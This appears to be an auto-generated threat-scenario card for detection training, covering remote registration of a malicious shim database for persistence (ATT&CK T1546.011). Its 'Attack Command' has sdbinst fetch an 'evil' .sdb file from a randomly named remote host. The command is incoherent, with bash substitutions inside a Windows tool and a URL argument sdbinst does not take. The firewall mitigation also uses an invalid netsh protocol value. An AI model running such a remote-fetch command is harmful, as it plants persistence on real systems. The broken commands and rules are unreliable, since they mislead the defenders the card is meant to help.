---
type: campaign
scenario_id: 264
tactic: Persistence
technique: "T1546.011: Application Shimming"
technique_id: T1546.011
tags: [campaign, lotl, persistence]
---

# Registering malicious shim remotely for persistence.

## Threat Description
Registering malicious shim remotely for persistence.

## Attack Command
```
sdbinst http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).sdb) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor sdbinst remote: `wmic process where name='sdbinst.exe' get commandline | findstr http`; Event ID 4688.

## Mitigation
Restrict sdbinst: `icacls %windir%\System32\sdbinst.exe /deny Everyone:RX`; Block shim downloads: `netsh advfirewall firewall add rule name='Block Shim' dir=out action=block protocol=HTTP`.

## AI Training Prompt
Train AI to detect remote shim registration and suggest firewall rules.

## References
- MITRE ATT&CK T1546.011: https://attack.mitre.org/techniques/T1546/011/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
